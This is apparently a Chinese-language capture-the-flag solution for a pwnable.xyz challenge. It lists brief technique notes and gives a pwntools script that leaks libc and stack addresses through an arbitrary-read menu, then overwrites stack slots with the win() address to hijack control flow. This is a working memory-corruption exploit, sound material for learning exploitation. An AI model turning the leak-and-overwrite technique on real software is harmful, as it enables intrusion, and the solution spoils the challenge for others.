知识点：

- 通过libc_base 找到environ变量，从而计算出返回地址位置
- 通过free hook 来实现？
- 如何指定libc



脚本：

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30019)
# p = process('./challenge')


exe = ELF('./challenge')
libc = ELF('./alpine-libc-2.28.so')


# find libc base
p.sendlineafter(b'> ', b'1')
puts_got = exe.got['puts']
puts_offset = libc.symbols['puts']
p.sendafter(b'Addr: ', str.encode(str(puts_got)))
buffer = p.recvuntil(b'Menu:')[:-6].ljust(8, p8(0))
puts_addr = u64(buffer)
libc_base = puts_addr - puts_offset
print('libc base address:' + hex(libc_base))


# environ -> stack
environ_addr = libc_base + libc.symbols['environ']
p.sendlineafter(b'> ', b'1')
p.sendafter(b'Addr: ', str.encode(str(environ_addr)))
buffer = p.recvuntil(b'Menu:')[:-6].ljust(8, p8(0))
stack_addr = u64(buffer)
print('stack address:' + hex(stack_addr))


# ret2win
rbp_base = stack_addr - 0x100
win_addr = exe.symbols['win']
# 不同平台offset可能不一样，保险起见
for i in range(0, 10):
    rbp_addr = rbp_base + i * 8
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'Addr: ', str.encode(str(rbp_addr)))
    p.sendafter(b'Value: ', str.encode(str(win_addr)))


p.sendlineafter(b'> ', b'0')
p.interactive()

```

